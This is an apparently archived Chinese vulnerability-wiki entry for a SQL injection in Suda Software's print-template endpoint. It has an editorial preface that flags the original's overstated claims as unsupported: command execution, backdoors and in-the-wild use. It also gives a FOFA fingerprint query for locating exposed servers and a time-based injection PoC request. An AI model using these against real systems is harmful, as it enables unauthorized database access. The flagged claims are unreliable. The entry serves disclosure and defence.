---
source: "SourByte05/Vulnerability-Wiki-PoC"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "速达软件 多款产品 doSavePrintTpl.action SQL注入漏洞"
product: "速达软件打印模板接口"
record_type: "unknown"
document_type: "技术文章（细分类待核）"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "多款产品未列具体型号版本"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/%E9%80%9F%E8%BE%BE%E8%BD%AF%E4%BB%B6%20%E5%A4%9A%E6%AC%BE%E4%BA%A7%E5%93%81%20doSavePrintTpl.action%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "missing"
source_note: "原始出处待补；仓库归档不等同原始披露"
fofa_unverified: "body="
fofa: "body=\"速达软件技术（广州）有限公司\" && body=\"jslib/extjs2.3/view/PasswordField.js\""
id: "vw-c57b33ff761744fc02e328b5"
entity_id: "ve-c57b33ff761744fc02e328b5"
schema_version: "1"
---

# 速达软件 多款产品 doSavePrintTpl.action SQL注入漏洞

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：速达软件打印模板接口
- 文献类型：技术文章（细分类待核）
- 版本、权限及部署边界：多款产品未列具体型号版本
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 使用Struts2不自动导致SQL注入
2. 5秒延迟PoC不能证明系统命令执行/后门
3. FOFA body=截断
4. HTTP未围栏造成换行渲染损坏
5. 多款产品未列具体型号版本
6. 在野已知无来源
7. 保存模板接口可能改状态需确认，修复仅泛建议

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原始披露 URL 未确认；既有归档来源标签保留，不能替代原始公告

### 归档技术正文

# 漏洞描述

由于速达软件 多款产品使用Struts2开发框架组件，存在sql注入漏洞，未经身份验证的远程攻击者可利用此漏洞执行任意系统命令，写入后门文件，获取服务器权限。

# 影响版本

速达软件

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="速达软件技术（广州）有限公司" && body="jslib/extjs2.3/view/PasswordField.js"

POC/EXP：

```http
GET /common/print/print!doSavePrintTpl.action?report=1&rptid=1&employId=-1&modId=-1&accsetName=1%27;WAITFOR+DELAY%270:0:5%27-- HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
```


![image-20250306202652910](./.resource/速达软件多款产品doSavePrintTpl.actionSQL注入漏洞/media/image-20250306202652910.png)


![image-20250306202746937](./.resource/速达软件多款产品doSavePrintTpl.actionSQL注入漏洞/media/image-20250306202746937.png)


# 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
